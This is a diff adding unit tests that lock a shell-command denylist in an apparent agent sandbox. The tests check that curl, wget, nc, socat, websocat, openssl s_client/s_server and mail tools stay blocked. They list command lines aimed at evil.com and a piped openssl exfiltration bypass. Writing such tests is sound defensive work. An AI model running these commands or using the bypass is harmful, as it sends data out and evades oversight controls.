@@ -499,6 +499,59 @@ describe("SecurityLayer kernel-class dispatch", () => {
     });
   });
 
+  // ── R4-12: network / dual-use binary denylist (build-time lock) ──
+
+  describe("R4-12: network/dual-use binaries are BLOCKED (denylist lock)", () => {
+    const commonCtx = {
+      workspace: WORKSPACE,
+      fileAccessMode: "common" as const,
+      allowedPathCheck: () => false,
+    };
+
+    // Data-driven lock: each of these must be BLOCKED in common mode. Dropping
+    // an entry from BLOCKED_COMMANDS fails CI here. Includes the pre-existing
+    // curl/wget/nc/socat so they're locked too, not just the newly added ones.
+    const blockedNetBins = [
+      "websocat ws://evil.com",
+      "openssl s_client -connect evil.com:443",
+      "openssl s_server -accept 443",
+      "sendmail -t",
+      "mail -s hi a@b.com",
+      "mailx -s hi a@b.com",
+      "curl https://evil.com",
+      "wget https://evil.com",
+      "nc evil.com 443",
+      "socat - TCP:evil.com:443",
+    ];
+    for (const cmd of blockedNetBins) {
+      it(`BLOCKS \`${cmd}\` (evaluateShellCommand, common mode)`, () => {
+        expect(evaluateShellCommand(cmd, "common", WORKSPACE).allowed).toBe(false);
+      });
+      it(`BLOCKS \`${cmd}\` (evaluateShellCommandAndPaths, common mode)`, () => {
+        expect(evaluateShellCommandAndPaths(cmd, commonCtx).allowed).toBe(false);
+      });
+    }
+
+    // openssl is dual-use: its hashing / cert / key subcommands MUST stay
+    // allowed — only s_client/s_server (the raw-TLS pipe) is blocked.
+    const allowedOpenssl = [
+      "openssl dgst -sha256 f",
+      "openssl x509 -in c.pem -noout",
+      "openssl enc -d -aes-256-cbc",
+    ];
+    for (const cmd of allowedOpenssl) {
+      it(`ALLOWS \`${cmd}\` (benign openssl subcommand)`, () => {
+        expect(evaluateShellCommand(cmd, "common", WORKSPACE).allowed).toBe(true);
+        expect(evaluateShellCommandAndPaths(cmd, commonCtx).allowed).toBe(true);
+      });
+    }
+
+    // The raw-TLS pipe via stdin is the GUARANTEED-reachable bypass; block it.
+    it("BLOCKS the piped raw-TLS exfil form (echo x | openssl s_client …)", () => {
+      expect(evaluateShellCommand("echo x | openssl s_client -connect h:443", "common", WORKSPACE).allowed).toBe(false);
+    });
+  });
+
   // ── 9: database-class ──
 
   describe("database-class tools", () => {
